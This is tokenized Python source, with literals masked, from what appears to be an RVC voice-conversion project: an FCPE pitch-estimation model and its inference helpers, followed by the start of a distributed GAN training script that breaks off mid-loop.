self . fast_attention ( q , k , v ) <EOL> attn_outs . append ( out ) <EOL> if not empty ( lq ) : <EOL> assert ( <EOL> not cross_attend <EOL> ) , "<STR_LIT>" <EOL> out = self . local_attn ( lq , lk , lv , input_mask = mask ) <EOL> attn_outs . append ( out ) <EOL> out = torch . cat ( attn_outs , dim = <NUM_LIT> ) <EOL> out = rearrange ( out , "<STR_LIT>" ) <EOL> out = self . to_out ( out ) <EOL> return self . dropout ( out ) <EOL> def l2_regularization ( model , l2_alpha ) : <EOL> l2_loss = [ ] <EOL> for module in model . modules ( ) : <EOL> if type ( module ) is nn . Conv2d : <EOL> l2_loss . append ( ( module . weight ** <NUM_LIT> ) . sum ( ) / <NUM_LIT> ) <EOL> return l2_alpha * sum ( l2_loss ) <EOL> class FCPE ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> input_channel = <NUM_LIT> , <EOL> out_dims = <NUM_LIT> , <EOL> n_layers = <NUM_LIT> , <EOL> n_chans = <NUM_LIT> , <EOL> use_siren = False , <EOL> use_full = False , <EOL> loss_mse_scale = <NUM_LIT> , <EOL> loss_l2_regularization = False , <EOL> loss_l2_regularization_scale = <NUM_LIT> , <EOL> loss_grad1_mse = False , <EOL> loss_grad1_mse_scale = <NUM_LIT> , <EOL> f0_max = <NUM_LIT> , <EOL> f0_min = <NUM_LIT> , <EOL> confidence = False , <EOL> threshold = <NUM_LIT> , <EOL> use_input_conv = True , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> if use_siren is True : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> if use_full is True : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> self . loss_mse_scale = loss_mse_scale if ( loss_mse_scale is not None ) else <NUM_LIT> <EOL> self . loss_l2_regularization = ( <EOL> loss_l2_regularization if ( loss_l2_regularization is not None ) else False <EOL> ) <EOL> self . loss_l2_regularization_scale = ( <EOL> loss_l2_regularization_scale <EOL> if ( loss_l2_regularization_scale is not None ) <EOL> else <NUM_LIT> <EOL> ) <EOL> self . loss_grad1_mse = loss_grad1_mse if ( loss_grad1_mse is not None ) else False <EOL> self . loss_grad1_mse_scale = ( <EOL> loss_grad1_mse_scale if ( loss_grad1_mse_scale is not None ) else <NUM_LIT> <EOL> ) <EOL> self . f0_max = f0_max if ( f0_max is not None ) else <NUM_LIT> <EOL> self . f0_min = f0_min if ( f0_min is not None ) else <NUM_LIT> <EOL> self . confidence = confidence if ( confidence is not None ) else False <EOL> self . threshold = threshold if ( threshold is not None ) else <NUM_LIT> <EOL> self . use_input_conv = use_input_conv if ( use_input_conv is not None ) else True <EOL> self . cent_table_b = torch . Tensor ( <EOL> np . linspace ( <EOL> self . f0_to_cent ( torch . Tensor ( [ f0_min ] ) ) [ <NUM_LIT> ] , <EOL> self . f0_to_cent ( torch . Tensor ( [ f0_max ] ) ) [ <NUM_LIT> ] , <EOL> out_dims , <EOL> ) <EOL> ) <EOL> self . register_buffer ( "<STR_LIT>" , self . cent_table_b ) <EOL> _leaky = nn . LeakyReLU ( ) <EOL> self . stack = nn . Sequential ( <EOL> nn . Conv1d ( input_channel , n_chans , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) , <EOL> nn . GroupNorm ( <NUM_LIT> , n_chans ) , <EOL> _leaky , <EOL> nn . Conv1d ( n_chans , n_chans , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) , <EOL> ) <EOL> self . decoder = PCmer ( <EOL> num_layers = n_layers , <EOL> num_heads = <NUM_LIT> , <EOL> dim_model = n_chans , <EOL> dim_keys = n_chans , <EOL> dim_values = n_chans , <EOL> residual_dropout = <NUM_LIT> , <EOL> attention_dropout = <NUM_LIT> , <EOL> ) <EOL> self . norm = nn . LayerNorm ( n_chans ) <EOL> self . n_out = out_dims <EOL> self . dense_out = weight_norm ( nn . Linear ( n_chans , self . n_out ) ) <EOL> def forward ( <EOL> self , mel , infer = True , gt_f0 = None , return_hz_f0 = False , cdecoder = "<STR_LIT>" <EOL> ) : <EOL> if cdecoder == "<STR_LIT>" : <EOL> self . cdecoder = self . cents_decoder <EOL> elif cdecoder == "<STR_LIT>" : <EOL> self . cdecoder = self . cents_local_decoder <EOL> if self . use_input_conv : <EOL> x = self . stack ( mel . transpose ( <NUM_LIT> , <NUM_LIT> ) ) . transpose ( <NUM_LIT> , <NUM_LIT> ) <EOL> else : <EOL> x = mel <EOL> x = self . decoder ( x ) <EOL> x = self . norm ( x ) <EOL> x = self . dense_out ( x ) <EOL> x = torch . sigmoid ( x ) <EOL> if not infer : <EOL> gt_cent_f0 = self . f0_to_cent ( gt_f0 ) <EOL> gt_cent_f0 = self . gaussian_blurred_cent ( gt_cent_f0 ) <EOL> loss_all = self . loss_mse_scale * F . binary_cross_entropy ( <EOL> x , gt_cent_f0 <EOL> ) <EOL> if self . loss_l2_regularization : <EOL> loss_all = loss_all + l2_regularization ( <EOL> model = self , l2_alpha = self . loss_l2_regularization_scale <EOL> ) <EOL> x = loss_all <EOL> if infer : <EOL> x = self . cdecoder ( x ) <EOL> x = self . cent_to_f0 ( x ) <EOL> if not return_hz_f0 : <EOL> x = ( <NUM_LIT> + x / <NUM_LIT> ) . log ( ) <EOL> return x <EOL> def cents_decoder ( self , y , mask = True ) : <EOL> B , N , _ = y . size ( ) <EOL> ci = self . cent_table [ None , None , : ] . expand ( B , N , - <NUM_LIT> ) <EOL> rtn = torch . sum ( ci * y , dim = - <NUM_LIT> , keepdim = True ) / torch . sum ( <EOL> y , dim = - <NUM_LIT> , keepdim = True <EOL> ) <EOL> if mask : <EOL> confident = torch . max ( y , dim = - <NUM_LIT> , keepdim = True ) [ <NUM_LIT> ] <EOL> confident_mask = torch . ones_like ( confident ) <EOL> confident_mask [ confident <= self . threshold ] = float ( "<STR_LIT>" ) <EOL> rtn = rtn * confident_mask <EOL> if self . confidence : <EOL> return rtn , confident <EOL> else : <EOL> return rtn <EOL> def cents_local_decoder ( self , y , mask = True ) : <EOL> B , N , _ = y . size ( ) <EOL> ci = self . cent_table [ None , None , : ] . expand ( B , N , - <NUM_LIT> ) <EOL> confident , max_index = torch . max ( y , dim = - <NUM_LIT> , keepdim = True ) <EOL> local_argmax_index = torch . arange ( <NUM_LIT> , <NUM_LIT> ) . to ( max_index . device ) + ( max_index - <NUM_LIT> ) <EOL> local_argmax_index [ local_argmax_index < <NUM_LIT> ] = <NUM_LIT> <EOL> local_argmax_index [ local_argmax_index >= self . n_out ] = self . n_out - <NUM_LIT> <EOL> ci_l = torch . gather ( ci , - <NUM_LIT> , local_argmax_index ) <EOL> y_l = torch . gather ( y , - <NUM_LIT> , local_argmax_index ) <EOL> rtn = torch . sum ( ci_l * y_l , dim = - <NUM_LIT> , keepdim = True ) / torch . sum ( <EOL> y_l , dim = - <NUM_LIT> , keepdim = True <EOL> ) <EOL> if mask : <EOL> confident_mask = torch . ones_like ( confident ) <EOL> confident_mask [ confident <= self . threshold ] = float ( "<STR_LIT>" ) <EOL> rtn = rtn * confident_mask <EOL> if self . confidence : <EOL> return rtn , confident <EOL> else : <EOL> return rtn <EOL> def cent_to_f0 ( self , cent ) : <EOL> return <NUM_LIT> * <NUM_LIT> ** ( cent / <NUM_LIT> ) <EOL> def f0_to_cent ( self , f0 ) : <EOL> return <NUM_LIT> * torch . log2 ( f0 / <NUM_LIT> ) <EOL> def gaussian_blurred_cent ( self , cents ) : <EOL> mask = ( cents > <NUM_LIT> ) & ( cents < ( <NUM_LIT> * np . log2 ( self . f0_max / <NUM_LIT> ) ) ) <EOL> B , N , _ = cents . size ( ) <EOL> ci = self . cent_table [ None , None , : ] . expand ( B , N , - <NUM_LIT> ) <EOL> return torch . exp ( - torch . square ( ci - cents ) / <NUM_LIT> ) * mask . float ( ) <EOL> class FCPEInfer : <EOL> def __init__ ( self , model_path , device = None , dtype = torch . float32 ) : <EOL> if device is None : <EOL> device = "<STR_LIT>" if torch . cuda . is_available ( ) else "<STR_LIT>" <EOL> self . device = device <EOL> ckpt = torch . load ( model_path , map_location = torch . device ( self . device ) ) <EOL> self . args = DotDict ( ckpt [ "<STR_LIT>" ] ) <EOL> self . dtype = dtype <EOL> model = FCPE ( <EOL> input_channel = self . args . model . input_channel , <EOL> out_dims = self . args . model . out_dims , <EOL> n_layers = self . args . model . n_layers , <EOL> n_chans = self . args . model . n_chans , <EOL> use_siren = self . args . model . use_siren , <EOL> use_full = self . args . model . use_full , <EOL> loss_mse_scale = self . args . loss . loss_mse_scale , <EOL> loss_l2_regularization = self . args . loss . loss_l2_regularization , <EOL> loss_l2_regularization_scale = self . args . loss . loss_l2_regularization_scale , <EOL> loss_grad1_mse = self . args . loss . loss_grad1_mse , <EOL> loss_grad1_mse_scale = self . args . loss . loss_grad1_mse_scale , <EOL> f0_max = self . args . model . f0_max , <EOL> f0_min = self . args . model . f0_min , <EOL> confidence = self . args . model . confidence , <EOL> ) <EOL> model . to ( self . device ) . to ( self . dtype ) <EOL> model . load_state_dict ( ckpt [ "<STR_LIT>" ] ) <EOL> model . eval ( ) <EOL> self . model = model <EOL> self . wav2mel = Wav2Mel ( self . args , dtype = self . dtype , device = self . device ) <EOL> @ torch . no_grad ( ) <EOL> def __call__ ( self , audio , sr , threshold = <NUM_LIT> ) : <EOL> self . model . threshold = threshold <EOL> audio = audio [ None , : ] <EOL> mel = self . wav2mel ( audio = audio , sample_rate = sr ) . to ( self . dtype ) <EOL> f0 = self . model ( mel = mel , infer = True , return_hz_f0 = True ) <EOL> return f0 <EOL> class Wav2Mel : <EOL> def __init__ ( self , args , device = None , dtype = torch . float32 ) : <EOL> self . sampling_rate = args . mel . sampling_rate <EOL> self . hop_size = args . mel . hop_size <EOL> if device is None : <EOL> device = "<STR_LIT>" if torch . cuda . is_available ( ) else "<STR_LIT>" <EOL> self . device = device <EOL> self . dtype = dtype <EOL> self . stft = STFT ( <EOL> args . mel . sampling_rate , <EOL> args . mel . num_mels , <EOL> args . mel . n_fft , <EOL> args . mel . win_size , <EOL> args . mel . hop_size , <EOL> args . mel . fmin , <EOL> args . mel . fmax , <EOL> ) <EOL> self . resample_kernel = { } <EOL> def extract_nvstft ( self , audio , keyshift = <NUM_LIT> , train = False ) : <EOL> mel = self . stft . get_mel ( audio , keyshift = keyshift , train = train ) . transpose ( <EOL> <NUM_LIT> , <NUM_LIT> <EOL> ) <EOL> return mel <EOL> def extract_mel ( self , audio , sample_rate , keyshift = <NUM_LIT> , train = False ) : <EOL> audio = audio . to ( self . dtype ) . to ( self . device ) <EOL> if sample_rate == self . sampling_rate : <EOL> audio_res = audio <EOL> else : <EOL> key_str = str ( sample_rate ) <EOL> if key_str not in self . resample_kernel : <EOL> self . resample_kernel [ key_str ] = Resample ( <EOL> sample_rate , self . sampling_rate , lowpass_filter_width = <NUM_LIT> <EOL> ) <EOL> self . resample_kernel [ key_str ] = ( <EOL> self . resample_kernel [ key_str ] . to ( self . dtype ) . to ( self . device ) <EOL> ) <EOL> audio_res = self . resample_kernel [ key_str ] ( audio ) <EOL> mel = self . extract_nvstft ( <EOL> audio_res , keyshift = keyshift , train = train <EOL> ) <EOL> n_frames = int ( audio . shape [ <NUM_LIT> ] // self . hop_size ) + <NUM_LIT> <EOL> if n_frames > int ( mel . shape [ <NUM_LIT> ] ) : <EOL> mel = torch . cat ( ( mel , mel [ : , - <NUM_LIT> : , : ] ) , <NUM_LIT> ) <EOL> if n_frames < int ( mel . shape [ <NUM_LIT> ] ) : <EOL> mel = mel [ : , : n_frames , : ] <EOL> return mel <EOL> def __call__ ( self , audio , sample_rate , keyshift = <NUM_LIT> , train = False ) : <EOL> return self . extract_mel ( audio , sample_rate , keyshift = keyshift , train = train ) <EOL> class DotDict ( dict ) : <EOL> def __getattr__ ( * args ) : <EOL> val = dict . get ( * args ) <EOL> return DotDict ( val ) if type ( val ) is dict else val <EOL> __setattr__ = dict . __setitem__ <EOL> __delattr__ = dict . __delitem__ <EOL> class F0Predictor ( object ) : <EOL> def compute_f0 ( self , wav , p_len ) : <EOL> pass <EOL> def compute_f0_uv ( self , wav , p_len ) : <EOL> pass <EOL> class FCPEF0Predictor ( F0Predictor ) : <EOL> def __init__ ( <EOL> self , <EOL> model_path , <EOL> hop_length = <NUM_LIT> , <EOL> f0_min = <NUM_LIT> , <EOL> f0_max = <NUM_LIT> , <EOL> dtype = torch . float32 , <EOL> device = None , <EOL> sampling_rate = <NUM_LIT> , <EOL> threshold = <NUM_LIT> , <EOL> ) : <EOL> self . fcpe = FCPEInfer ( model_path , device = device , dtype = dtype ) <EOL> self . hop_length = hop_length <EOL> self . f0_min = f0_min <EOL> self . f0_max = f0_max <EOL> if device is None : <EOL> self . device = "<STR_LIT>" if torch . cuda . is_available ( ) else "<STR_LIT>" <EOL> else : <EOL> self . device = device <EOL> self . threshold = threshold <EOL> self . sampling_rate = sampling_rate <EOL> self . dtype = dtype <EOL> self . name = "<STR_LIT>" <EOL> def repeat_expand ( <EOL> self , <EOL> content : Union [ torch . Tensor , np . ndarray ] , <EOL> target_len : int , <EOL> mode : str = "<STR_LIT>" , <EOL> ) : <EOL> ndim = content . ndim <EOL> if content . ndim == <NUM_LIT> : <EOL> content = content [ None , None ] <EOL> elif content . ndim == <NUM_LIT> : <EOL> content = content [ None ] <EOL> assert content . ndim == <NUM_LIT> <EOL> is_np = isinstance ( content , np . ndarray ) <EOL> if is_np : <EOL> content = torch . from_numpy ( content ) <EOL> results = torch . nn . functional . interpolate ( content , size = target_len , mode = mode ) <EOL> if is_np : <EOL> results = results . numpy ( ) <EOL> if ndim == <NUM_LIT> : <EOL> return results [ <NUM_LIT> , <NUM_LIT> ] <EOL> elif ndim == <NUM_LIT> : <EOL> return results [ <NUM_LIT> ] <EOL> def post_process ( self , x , sampling_rate , f0 , pad_to ) : <EOL> if isinstance ( f0 , np . ndarray ) : <EOL> f0 = torch . from_numpy ( f0 ) . float ( ) . to ( x . device ) <EOL> if pad_to is None : <EOL> return f0 <EOL> f0 = self . repeat_expand ( f0 , pad_to ) <EOL> vuv_vector = torch . zeros_like ( f0 ) <EOL> vuv_vector [ f0 > <NUM_LIT> ] = <NUM_LIT> <EOL> vuv_vector [ f0 <= <NUM_LIT> ] = <NUM_LIT> <EOL> nzindex = torch . nonzero ( f0 ) . squeeze ( ) <EOL> f0 = torch . index_select ( f0 , dim = <NUM_LIT> , index = nzindex ) . cpu ( ) . numpy ( ) <EOL> time_org = self . hop_length / sampling_rate * nzindex . cpu ( ) . numpy ( ) <EOL> time_frame = np . arange ( pad_to ) * self . hop_length / sampling_rate <EOL> vuv_vector = F . interpolate ( vuv_vector [ None , None , : ] , size = pad_to ) [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> if f0 . shape [ <NUM_LIT> ] <= <NUM_LIT> : <EOL> return ( <EOL> torch . zeros ( pad_to , dtype = torch . float , device = x . device ) . cpu ( ) . numpy ( ) , <EOL> vuv_vector . cpu ( ) . numpy ( ) , <EOL> ) <EOL> if f0 . shape [ <NUM_LIT> ] == <NUM_LIT> : <EOL> return ( <EOL> torch . ones ( pad_to , dtype = torch . float , device = x . device ) * f0 [ <NUM_LIT> ] <EOL> ) . cpu ( ) . numpy ( ) , vuv_vector . cpu ( ) . numpy ( ) <EOL> f0 = np . interp ( time_frame , time_org , f0 , left = f0 [ <NUM_LIT> ] , right = f0 [ - <NUM_LIT> ] ) <EOL> return f0 , vuv_vector . cpu ( ) . numpy ( ) <EOL> def compute_f0 ( self , wav , p_len = None ) : <EOL> x = torch . FloatTensor ( wav ) . to ( self . dtype ) . to ( self . device ) <EOL> if p_len is None : <EOL> print ( "<STR_LIT>" ) <EOL> p_len = x . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 = self . fcpe ( x , sr = self . sampling_rate , threshold = self . threshold ) [ <NUM_LIT> , : , <NUM_LIT> ] <EOL> if torch . all ( f0 == <NUM_LIT> ) : <EOL> rtn = f0 . cpu ( ) . numpy ( ) if p_len is None else np . zeros ( p_len ) <EOL> return rtn , rtn <EOL> return self . post_process ( x , self . sampling_rate , f0 , p_len ) [ <NUM_LIT> ] <EOL> def compute_f0_uv ( self , wav , p_len = None ) : <EOL> x = torch . FloatTensor ( wav ) . to ( self . dtype ) . to ( self . device ) <EOL> if p_len is None : <EOL> p_len = x . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 = self . fcpe ( x , sr = self . sampling_rate , threshold = self . threshold ) [ <NUM_LIT> , : , <NUM_LIT> ] <EOL> if torch . all ( f0 == <NUM_LIT> ) : <EOL> rtn = f0 . cpu ( ) . numpy ( ) if p_len is None else np . zeros ( p_len ) <EOL> return rtn , rtn <EOL> return self . post_process ( x , self . sampling_rate , f0 , p_len ) <EOL> </s>
<s> import torch <EOL> import sys <EOL> import os <EOL> import datetime <EOL> from utils import ( <EOL> get_hparams , <EOL> plot_spectrogram_to_numpy , <EOL> summarize , <EOL> load_checkpoint , <EOL> save_checkpoint , <EOL> latest_checkpoint_path , <EOL> ) <EOL> from random import randint , shuffle <EOL> from time import sleep <EOL> from time import time as ttime <EOL> from torch . cuda . amp import GradScaler , autocast <EOL> from torch . nn import functional as F <EOL> from torch . nn . parallel import DistributedDataParallel as DDP <EOL> from torch . utils . data import DataLoader <EOL> from torch . utils . tensorboard import SummaryWriter <EOL> import torch . distributed as dist <EOL> import torch . multiprocessing as mp <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( os . path . join ( now_dir ) ) <EOL> from data_utils import ( <EOL> DistributedBucketSampler , <EOL> TextAudioCollate , <EOL> TextAudioCollateMultiNSFsid , <EOL> TextAudioLoader , <EOL> TextAudioLoaderMultiNSFsid , <EOL> ) <EOL> from losses import ( <EOL> discriminator_loss , <EOL> feature_loss , <EOL> generator_loss , <EOL> kl_loss , <EOL> ) <EOL> from mel_processing import mel_spectrogram_torch , spec_to_mel_torch <EOL> from rvc . train . process . extract_model import extract_model <EOL> from rvc . lib . infer_pack import commons <EOL> hps = get_hparams ( ) <EOL> if hps . version == "<STR_LIT>" : <EOL> from rvc . lib . infer_pack . models import MultiPeriodDiscriminator <EOL> from rvc . lib . infer_pack . models import SynthesizerTrnMs256NSFsid as RVC_Model_f0 <EOL> from rvc . lib . infer_pack . models import ( <EOL> SynthesizerTrnMs256NSFsid_nono as RVC_Model_nof0 , <EOL> ) <EOL> elif hps . version == "<STR_LIT>" : <EOL> from rvc . lib . infer_pack . models import ( <EOL> SynthesizerTrnMs768NSFsid as RVC_Model_f0 , <EOL> SynthesizerTrnMs768NSFsid_nono as RVC_Model_nof0 , <EOL> MultiPeriodDiscriminatorV2 as MultiPeriodDiscriminator , <EOL> ) <EOL> os . environ [ "<STR_LIT>" ] = hps . gpus . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> n_gpus = len ( hps . gpus . split ( "<STR_LIT>" ) ) <EOL> torch . backends . cudnn . deterministic = False <EOL> torch . backends . cudnn . benchmark = False <EOL> global_step = <NUM_LIT> <EOL> lowest_value = { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : float ( "<STR_LIT>" ) , "<STR_LIT>" : <NUM_LIT> } <EOL> last_loss_gen_all = <NUM_LIT> <EOL> epochs_since_last_lowest = <NUM_LIT> <EOL> class EpochRecorder : <EOL> def __init__ ( self ) : <EOL> self . last_time = ttime ( ) <EOL> def record ( self ) : <EOL> now_time = ttime ( ) <EOL> elapsed_time = now_time - self . last_time <EOL> self . last_time = now_time <EOL> elapsed_time = round ( elapsed_time , <NUM_LIT> ) <EOL> elapsed_time_str = str ( datetime . timedelta ( seconds = int ( elapsed_time ) ) ) <EOL> current_time = datetime . datetime . now ( ) . strftime ( "<STR_LIT>" ) <EOL> return f"<STR_LIT>" <EOL> def main ( ) : <EOL> n_gpus = torch . cuda . device_count ( ) <EOL> if torch . cuda . is_available ( ) == False and torch . backends . mps . is_available ( ) == True : <EOL> n_gpus = <NUM_LIT> <EOL> if n_gpus < <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> n_gpus = <NUM_LIT> <EOL> children = [ ] <EOL> pid_file_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> with open ( pid_file_path , "<STR_LIT>" ) as pid_file : <EOL> for i in range ( n_gpus ) : <EOL> subproc = mp . Process ( <EOL> target = run , <EOL> args = ( i , n_gpus , hps ) , <EOL> ) <EOL> children . append ( subproc ) <EOL> subproc . start ( ) <EOL> pid_file . write ( str ( subproc . pid ) + "<STR_LIT>" ) <EOL> for i in range ( n_gpus ) : <EOL> children [ i ] . join ( ) <EOL> def run ( <EOL> rank , <EOL> n_gpus , <EOL> hps , <EOL> ) : <EOL> global global_step <EOL> if rank == <NUM_LIT> : <EOL> writer = SummaryWriter ( log_dir = hps . model_dir ) <EOL> writer_eval = SummaryWriter ( log_dir = os . path . join ( hps . model_dir , "<STR_LIT>" ) ) <EOL> os . environ [ "<STR_LIT>" ] = "<STR_LIT>" <EOL> os . environ [ "<STR_LIT>" ] = str ( randint ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> dist . init_process_group ( <EOL> backend = "<STR_LIT>" , init_method = "<STR_LIT>" , world_size = n_gpus , rank = rank <EOL> ) <EOL> torch . manual_seed ( hps . train . seed ) <EOL> if torch . cuda . is_available ( ) : <EOL> torch . cuda . set_device ( rank ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> train_dataset = TextAudioLoaderMultiNSFsid ( hps . data ) <EOL> else : <EOL> train_dataset = TextAudioLoader ( hps . data ) <EOL> train_sampler = DistributedBucketSampler ( <EOL> train_dataset , <EOL> hps . train . batch_size * n_gpus , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> num_replicas = n_gpus , <EOL> rank = rank , <EOL> shuffle = True , <EOL> ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> collate_fn = TextAudioCollateMultiNSFsid ( ) <EOL> else : <EOL> collate_fn = TextAudioCollate ( ) <EOL> train_loader = DataLoader ( <EOL> train_dataset , <EOL> num_workers = <NUM_LIT> , <EOL> shuffle = False , <EOL> pin_memory = True , <EOL> collate_fn = collate_fn , <EOL> batch_sampler = train_sampler , <EOL> persistent_workers = True , <EOL> prefetch_factor = <NUM_LIT> , <EOL> ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> net_g = RVC_Model_f0 ( <EOL> hps . data . filter_length // <NUM_LIT> + <NUM_LIT> , <EOL> hps . train . segment_size // hps . data . hop_length , <EOL> ** hps . model , <EOL> is_half = hps . train . fp16_run , <EOL> sr = hps . sample_rate , <EOL> ) <EOL> else : <EOL> net_g = RVC_Model_nof0 ( <EOL> hps . data . filter_length // <NUM_LIT> + <NUM_LIT> , <EOL> hps . train . segment_size // hps . data . hop_length , <EOL> ** hps . model , <EOL> is_half = hps . train . fp16_run , <EOL> ) <EOL> if torch . cuda . is_available ( ) : <EOL> net_g = net_g . cuda ( rank ) <EOL> net_d = MultiPeriodDiscriminator ( hps . model . use_spectral_norm ) <EOL> if torch . cuda . is_available ( ) : <EOL> net_d = net_d . cuda ( rank ) <EOL> optim_g = torch . optim . AdamW ( <EOL> net_g . parameters ( ) , <EOL> hps . train . learning_rate , <EOL> betas = hps . train . betas , <EOL> eps = hps . train . eps , <EOL> ) <EOL> optim_d = torch . optim . AdamW ( <EOL> net_d . parameters ( ) , <EOL> hps . train . learning_rate , <EOL> betas = hps . train . betas , <EOL> eps = hps . train . eps , <EOL> ) <EOL> if torch . cuda . is_available ( ) : <EOL> net_g = DDP ( net_g , device_ids = [ rank ] ) <EOL> net_d = DDP ( net_d , device_ids = [ rank ] ) <EOL> else : <EOL> net_g = DDP ( net_g ) <EOL> net_d = DDP ( net_d ) <EOL> try : <EOL> print ( "<STR_LIT>" ) <EOL> _ , _ , _ , epoch_str = load_checkpoint ( <EOL> latest_checkpoint_path ( hps . model_dir , "<STR_LIT>" ) , net_d , optim_d <EOL> ) <EOL> _ , _ , _ , epoch_str = load_checkpoint ( <EOL> latest_checkpoint_path ( hps . model_dir , "<STR_LIT>" ) , net_g , optim_g <EOL> ) <EOL> global_step = ( epoch_str - <NUM_LIT> ) * len ( train_loader ) <EOL> except : <EOL> epoch_str = <NUM_LIT> <EOL> global_step = <NUM_LIT> <EOL> if hps . pretrainG != "<STR_LIT>" : <EOL> if rank == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> if hasattr ( net_g , "<STR_LIT>" ) : <EOL> print ( <EOL> net_g . module . load_state_dict ( <EOL> torch . load ( hps . pretrainG , map_location = "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> ) <EOL> ) <EOL> else : <EOL> print ( <EOL> net_g . load_state_dict ( <EOL> torch . load ( hps . pretrainG , map_location = "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> ) <EOL> ) <EOL> if hps . pretrainD != "<STR_LIT>" : <EOL> if rank == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> if hasattr ( net_d , "<STR_LIT>" ) : <EOL> print ( <EOL> net_d . module . load_state_dict ( <EOL> torch . load ( hps . pretrainD , map_location = "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> ) <EOL> ) <EOL> else : <EOL> print ( <EOL> net_d . load_state_dict ( <EOL> torch . load ( hps . pretrainD , map_location = "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> ) <EOL> ) <EOL> scheduler_g = torch . optim . lr_scheduler . ExponentialLR ( <EOL> optim_g , gamma = hps . train . lr_decay , last_epoch = epoch_str - <NUM_LIT> <EOL> ) <EOL> scheduler_d = torch . optim . lr_scheduler . ExponentialLR ( <EOL> optim_d , gamma = hps . train . lr_decay , last_epoch = epoch_str - <NUM_LIT> <EOL> ) <EOL> scaler = GradScaler ( enabled = hps . train . fp16_run ) <EOL> cache = [ ] <EOL> for epoch in range ( epoch_str , hps . train . epochs + <NUM_LIT> ) : <EOL> if rank == <NUM_LIT> : <EOL> train_and_evaluate ( <EOL> rank , <EOL> epoch , <EOL> hps , <EOL> [ net_g , net_d ] , <EOL> [ optim_g , optim_d ] , <EOL> scaler , <EOL> [ train_loader , None ] , <EOL> [ writer , writer_eval ] , <EOL> cache , <EOL> ) <EOL> else : <EOL> train_and_evaluate ( <EOL> rank , <EOL> epoch , <EOL> hps , <EOL> [ net_g , net_d ] , <EOL> [ optim_g , optim_d ] , <EOL> scaler , <EOL> [ train_loader , None ] , <EOL> None , <EOL> cache , <EOL> ) <EOL> scheduler_g . step ( ) <EOL> scheduler_d . step ( ) <EOL> def train_and_evaluate ( rank , epoch , hps , nets , optims , scaler , loaders , writers , cache ) : <EOL> global global_step , last_loss_gen_all , lowest_value , epochs_since_last_lowest <EOL> if epoch == <NUM_LIT> : <EOL> lowest_value = { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : float ( "<STR_LIT>" ) , "<STR_LIT>" : <NUM_LIT> } <EOL> last_loss_gen_all = <NUM_LIT> <EOL> epochs_since_last_lowest = <NUM_LIT> <EOL> net_g , net_d = nets <EOL> optim_g , optim_d = optims <EOL> train_loader = loaders [ <NUM_LIT> ] if loaders is not None else None <EOL> if writers is not None : <EOL> writer = writers [ <NUM_LIT> ] <EOL> train_loader . batch_sampler . set_epoch ( epoch ) <EOL> net_g . train ( ) <EOL> net_d . train ( ) <EOL> if hps . if_cache_data_in_gpu == True : <EOL> data_iterator = cache <EOL> if cache == [ ] : <EOL> for batch_idx , info in enumerate ( train_loader ) : <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> ( <EOL> phone , <EOL> phone_lengths , <EOL> pitch , <EOL> pitchf , <EOL> spec , <EOL> spec_lengths , <EOL> wave , <EOL> wave_lengths , <EOL> sid , <EOL> ) = info <EOL> else : <EOL> ( <EOL> phone , <EOL> phone_lengths , <EOL> spec , <EOL> spec_lengths , <EOL> wave , <EOL> wave_lengths , <EOL> sid , <EOL> ) = info <EOL> if torch . cuda . is_available ( ) : <EOL> phone = phone . cuda ( rank , non_blocking = True ) <EOL> phone_lengths = phone_lengths . cuda ( rank , non_blocking = True ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> pitch = pitch . cuda ( rank , non_blocking = True ) <EOL> pitchf = pitchf . cuda ( rank , non_blocking = True ) <EOL> sid = sid . cuda ( rank , non_blocking = True ) <EOL> spec = spec . cuda ( rank , non_blocking = True ) <EOL> spec_lengths = spec_lengths . cuda ( rank , non_blocking = True ) <EOL> wave = wave . cuda ( rank , non_blocking = True ) <EOL> wave_lengths = wave_lengths . cuda ( rank , non_blocking = True ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> cache . append ( <EOL> ( <EOL> batch_idx , <EOL> ( <EOL> phone , <EOL> phone_lengths , <EOL> pitch , <EOL> pitchf , <EOL> spec , <EOL> spec_lengths , <EOL> wave , <EOL> wave_lengths , <EOL> sid , <EOL> ) , <EOL> ) <EOL> ) <EOL> else : <EOL> cache . append ( <EOL> ( <EOL> batch_idx , <EOL> ( <EOL> phone , <EOL> phone_lengths , <EOL> spec , <EOL> spec_lengths , <EOL> wave , <EOL> wave_lengths , <EOL> sid , <EOL> ) , <EOL> ) <EOL> ) <EOL> else : <EOL> shuffle ( cache ) <EOL> else : <EOL> data_iterator = enumerate ( train_loader ) <EOL> epoch_recorder = EpochRecorder ( ) <EOL> for batch_idx , info in data_iterator : <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> ( <EOL> phone , <EOL> phone_lengths , <EOL> pitch , <EOL> pitchf , <EOL> spec , <EOL> spec_lengths , <EOL> wave , <EOL> wave_lengths , <EOL> sid , <EOL> ) = info <EOL> else : <EOL> phone , phone_lengths , 